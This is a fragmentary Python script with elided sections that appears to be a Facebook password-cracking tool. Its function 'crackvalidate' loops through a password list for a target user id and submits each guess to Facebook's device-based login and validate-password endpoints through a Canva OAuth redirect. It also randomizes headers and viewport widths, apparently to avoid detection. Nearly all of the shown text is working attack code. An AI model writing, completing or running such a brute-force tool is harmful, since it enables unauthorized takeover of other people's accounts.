...
for Xr in range (10000):	
	...
	o=random.choice(['mark.facebook.com','com.facebook.zuck','version.facebook.com'])
...
def crackvalidate(idf,pwx,url):
	...
	for pw in pwx:
		try:
			...
			link = ses.get(f"https://{url}/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D9758b19b-0cec-4286-9be4-cd595d8a2d80%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db82a219a-888b-4f7e-8102-5fc1d3fd6eb8%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D9758b19b-0cec-4286-9be4-cd595d8a2d80%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
		...
		'viewport-width': f'{str(rr(400,999))}',
	     ...
	     'accept-language': 'zh-CN,en-US;q=0.8,en;q=0.7',
			...
			links = rc([f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID"])
